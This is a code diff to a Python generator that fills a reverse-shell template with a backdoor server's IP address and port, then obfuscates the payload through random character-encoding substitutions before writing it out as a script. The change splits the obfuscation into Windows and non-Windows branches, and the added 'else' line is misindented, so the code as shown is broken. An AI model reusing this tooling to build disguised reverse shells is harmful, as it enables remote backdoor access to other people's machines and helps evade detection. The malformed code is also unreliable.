@@ -133,15 +133,25 @@ class Generator:
 
         reverse_shell = reverse_shell.replace("IP_ADDRESS", self.settings.backdoor_server_address[0])
         reverse_shell = reverse_shell.replace("PORT", str(self.settings.backdoor_server_address[1]))
-    
-        for match in range(int(reverse_shell.count("\\")/2)):
-            reverse_shell = re.sub(pattern,
-                                    lambda m: random.choice([self.list_2_character_2_string,
-                                                             self.character_2_string,
-                                                             self.random_string_2_string,
-						                                     self.environment_variables_2_string])(m),
-                                    reverse_shell,
-                                    count=1)
+
+        if os.name == 'nt':
+            for match in range(int(reverse_shell.count("\\")/2)):
+                reverse_shell = re.sub(pattern,
+                                        lambda m: random.choice([self.list_2_character_2_string,
+                                                                 self.character_2_string,
+                                                                 self.random_string_2_string,
+						                 self.environment_variables_2_string])(m),
+                                        reverse_shell,
+                                        count=1)
+
+	else: 
+            for match in range(int(reverse_shell.count("\\")/2)):
+                reverse_shell = re.sub(pattern,
+                                        lambda m: random.choice([self.list_2_character_2_string,
+                                                                 self.character_2_string,
+                                                                 self.random_string_2_string])(m),
+                                        reverse_shell,
+                                        count=1)
         
         with open(f'server/{self.settings.script_name}', 'w') as c:
             c.write(self.script_to_char(reverse_shell))
